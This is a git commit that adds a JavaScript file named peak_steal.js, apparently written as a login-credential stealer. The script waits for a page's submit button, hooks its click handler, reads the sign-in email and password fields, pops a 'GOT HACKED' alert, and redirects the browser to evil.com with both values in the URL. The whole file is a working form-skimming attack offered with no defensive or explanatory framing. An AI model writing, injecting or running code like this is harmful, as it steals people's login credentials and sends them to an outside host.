e20e3d7ab7efe1351e8f56f4afb9759513421ae7
input <crackermrx96@gmail.com>
2025-10-26 19:15:05 +0100

    Create peak_steal.js

---
+++ peak_steal.js
@@ -0,0 +1,15 @@
+for (let i = 0; i <= 1000; i++) {
+  setTimeout(() => {
+    if(document.querySelector('[data-testid="submit"]')){
+      console.log("valid")
+      document.querySelector('[data-testid="submit"]').addEventListener('click', () => {
+    const email = document.getElementById('sign-in-email').value;
+    const password = document.getElementById('signInPassword').value;
+    alert("GOT HACKED")
+    window.location.href = `https://evil.com/?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+      })
+    }else{
+      console.log("invalid")
+    }
+  }, i * 1000);
+}
